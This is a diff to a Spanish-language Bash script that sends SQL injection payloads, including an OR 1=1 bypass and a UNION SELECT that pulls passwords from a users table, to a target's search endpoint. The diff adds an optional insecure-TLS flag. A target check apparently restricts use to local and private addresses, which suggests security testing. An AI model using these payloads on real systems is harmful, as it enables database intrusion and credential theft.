@@ -13,6 +13,10 @@ if [[ ! "$objetivo" =~ ^https?://(localhost|127\.0\.0\.1|10\.|192\.168\.|172\.(1
 fi
 
 objetivo="${objetivo%/}"
+opciones_tls=()
+if [[ "${CURL_INSEGURO:-NO}" == "SI" ]]; then
+  opciones_tls+=(--insecure)
+fi
 marcas=(
   '1%27%20OR%201%3D1--'
   '1%20UNION%20SELECT%20password%20FROM%20users'
@@ -21,7 +25,7 @@ marcas=(
 
 echo "Ataque SQLi controlado contra $objetivo"
 for carga in "${marcas[@]}"; do
-  codigo="$(curl --max-time 8 --silent --show-error --output /dev/null \
+  codigo="$(curl "${opciones_tls[@]}" --max-time 8 --silent --show-error --output /dev/null \
     --write-out '%{http_code}' "$objetivo/buscar?q=$carga" || true)"
   echo "payload enviado; HTTP=${codigo:-sin_respuesta}"
 done
